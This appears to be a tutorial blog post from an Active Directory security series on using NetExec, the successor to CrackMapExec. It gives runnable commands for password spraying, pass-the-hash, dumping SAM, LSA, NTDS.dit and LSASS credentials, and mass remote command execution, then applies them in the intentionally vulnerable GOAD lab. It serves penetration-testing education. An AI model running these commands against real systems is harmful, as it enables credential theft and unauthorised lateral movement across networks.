---
layout: post
title: "10 Days of AD Security: Day 5 - NetExec"
date: 2026-02-09
category: Active Directory Security
author: James Wells
excerpt: "Day 5: NetExec (CrackMapExec successor) for network-wide credential validation, enumeration, and lateral movement."
tags: [NetExec, CrackMapExec, Active Directory, Red Team, AD Security Series]
---
## History and Overview

NetExec (NXC) is the official successor to the legendary CrackMapExec (CME), which was archived in December 2023 after years of being the go-to tool for post-exploitation in Active Directory environments. When CrackMapExec's original maintainer byt3bl33d3r stepped back, the community fork led by Pennyw0rth evolved into NetExec, bringing modernization, active development, and expanded protocol support. NetExec is a network execution toolkit that excels at automated password spraying, credential validation, SMB enumeration, and lateral movement across large Windows networks. The tool supports multiple protocols including SMB, SSH, LDAP, WinRM, RDP, MSSQL, NFS, and FTP, making it incredibly versatile. What sets NetExec apart is its modular architecture with over 100 community-contributed modules for specific tasks like BloodHound data collection, credential dumping, and certificate abuse. NetExec can operate at scale, testing credentials across hundreds of systems simultaneously, automatically identifying where privileges are elevated, and even marking compromised systems in BloodHound graphs. With 5.4k GitHub stars and inclusion in Kali Linux as of 2025, NetExec has firmly established itself as the spiritual successor to CrackMapExec.

## Download and Installation

**Official Source:** [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

**Installation:**

```bash
# On Kali Linux (included by default in 2025+)
sudo apt update
sudo apt install netexec

# Or install via pipx (recommended for latest version)
pipx install git+https://github.com/Pennyw0rth/NetExec

# Verify installation
netexec --version
nxc --version  # Short alias
```

**Database Setup:**
NetExec maintains local databases to track credentials and hosts:
```bash
# Initialize database
netexec smb 192.168.1.0/24 -u '' -p ''

# View database info
netexec smb --show-db
```

## When to Use NetExec

Use NetExec when you need to:
- **Test credentials at scale**: Validate username/password combinations across hundreds of systems
- **Enumerate SMB shares**: Discover accessible shares and sensitive data exposure
- **Map admin access**: Identify which accounts have local admin rights where
- **Perform lateral movement**: Execute commands across multiple systems simultaneously
- **Dump credentials**: Extract local SAM/LSA secrets or cached domain credentials
- **Automated reconnaissance**: Survey large AD environments efficiently
- **Password spraying**: Test common passwords against all domain accounts safely
- **Post-exploitation automation**: Chain multiple attacks across network infrastructure
- **BloodHound integration**: Mark owned systems and automatically collect SharpHound data

NetExec is used throughout post-exploitation, particularly for understanding the scope of access from compromised credentials and planning lateral movement.

## Walkthrough

**Basic Reconnaissance:**

```bash
# SMB enumeration without credentials
nxc smb 192.168.1.0/24

# Enumerate with null session
nxc smb 192.168.1.0/24 -u '' -p ''

# Check SMB signing status (relay attack opportunity)
nxc smb 192.168.1.0/24 --gen-relay-list targets.txt
```

**Credential Validation:**

```bash
# Test single credential
nxc smb 192.168.1.10 -u administrator -p Password123

# Test across multiple targets
nxc smb 192.168.1.0/24 -u administrator -p Password123

# Use password file
nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt

# Pass-the-Hash
nxc smb 192.168.1.10 -u administrator -H ':ntlmhash'
```

**Privilege Enumeration:**

```bash
# Check local admin access (Pwn3d! indicator)
nxc smb 192.168.1.0/24 -u administrator -p Password123

# The (Pwn3d!) indicator means you have admin rights
```

**Share Enumeration:**

```bash
# List shares
nxc smb 192.168.1.10 -u user -p pass --shares

# Spider shares for sensitive files
nxc smb 192.168.1.10 -u user -p pass -M spider_plus

# Download specific files
nxc smb 192.168.1.10 -u user -p pass --get-file "\\share\\path\\file.txt" ./local-file.txt
```

**Credential Dumping:**

```bash
# Dump SAM (local accounts)
nxc smb 192.168.1.10 -u administrator -p pass --sam

# Dump LSA secrets
nxc smb 192.168.1.10 -u administrator -p pass --lsa

# Dump NTDS.dit (Domain Controller only)
nxc smb 192.168.1.5 -u administrator -p pass --ntds

# Use modules for specific dumps
nxc smb 192.168.1.10 -u admin -p pass -M lsassy  # Memory dumping
```

**Command Execution:**

```bash
# Execute command via WMI
nxc smb 192.168.1.10 -u admin -p pass -x "whoami"

# Execute PowerShell
nxc smb 192.168.1.10 -u admin -p pass -X '$PSVersionTable'

# Execute across multiple hosts
nxc smb 192.168.1.0/24 -u admin -p pass -x "ipconfig" --threads 10
```

**Module Usage:**

```bash
# List available modules
nxc smb -L

# Use BloodHound module
nxc smb 192.168.1.10 -u user -p pass -M bloodhound

# Check for ADCS Certificate Services
nxc smb 192.168.1.0/24 -u user -p pass -M enum_ca

# AS-REP Roasting
nxc ldap 192.168.1.5 -u user -p pass -M asreproast
```

## Game of Active Directory Lab Example

In the GOAD environment, NetExec excels at automated discovery and lateral movement:

**Scenario: Complete GOAD Network Mapping**

1. **Initial Network Sweep**:
   ```bash
   # Scan all GOAD systems
   nxc smb 192.168.56.0/24

   # Identifies:
   # - Winterfell (DC - 192.168.56.11)
   # - Castleback, Meereen, Braavos (member servers)
   # - Various workstations
   ```

2. **Credential Validation After Initial Compromise**:
   ```bash
   # We cracked brandon.stark password from AS-REP roasting
   nxc smb 192.168.56.0/24 -u brandon.stark -p Password123 -d north.sevenkingdoms.local

   # Shows where brandon has access (likely his workstation)
   ```

3. **Escalation Testing with Multiple Creds**:
   ```bash
   # Test discovered credentials across GOAD
   nxc smb 192.168.56.0/24 -u users.txt -p passwords.txt --continue-on-success

   # Finds that jon.snow has admin on SQL server
   # (Pwn3d!) indicator appears
   ```

4. **Automated Credential Dumping**:
   ```bash
   # Dump credentials from all accessible systems
   nxc smb 192.168.56.0/24 -u jon.snow -p pass --sam --lsa

   # Collects local accounts and cached domain creds
   ```

5. **BloodHound Integration**:
   ```bash
   # Mark compromised accounts in BloodHound
   nxc smb 192.168.56.11 -u jon.snow -p pass -M bloodhound

   # Automatically:
   # - Runs SharpHound data collection
   # - Marks jon.snow as owned
   # - Updates attack path analysis
   ```

6. **ADCS Enumeration**:
   ```bash
   # Check for Certificate Services (GOAD has ADCS)
   nxc smb 192.168.56.0/24 -u user -p pass -M enum_ca

   # Reveals CA servers for Certipy exploitation
   ```

7. **Cross-Domain Credential Testing**:
   ```bash
   # Test credentials in Essos domain
   nxc smb 192.168.56.12 -u administrator@north -H :hash -d essos.local

   # Maps trust relationships and access paths
   ```

**GOAD-Specific NetExec Applications:**
- Automated discovery of GOAD's 5 domains and trust relationships
- Parallel credential testing across all GOAD systems simultaneously
- One-command credential dumps from all accessible servers
- Integration with GOAD's intentionally vulnerable ADCS setup
- Enumeration of GOAD's MSSQL instances and service accounts

## Conclusion

NetExec represents the evolution of network execution tooling for modern AD environments. Its active development, expanded protocol support, and modular architecture make it superior to its archived predecessor CrackMapExec. The tool's ability to operate at scale while maintaining detailed databases of discovered credentials and system access makes it invaluable for large penetration test engagements.

In the GOAD lab, NetExec serves as the primary automation tool for post-exploitation. Its efficiency at mapping the entire lab, testing credentials, and executing attacks across multiple systems saves hours of manual work. The BloodHound integration creates a powerful feedback loop where automated exploitation directly informs attack path analysis.

For practitioners moving from CrackMapExec, NetExec's syntax is largely compatible with minor enhancements. The community's embrace of NetExec ensures it will remain the standard network execution toolkit for AD penetration testing in the coming years.

**Next in this series:** Day 6 will cover Certipy, the Python toolkit for exploiting Active Directory Certificate Services (ADCS) vulnerabilities.
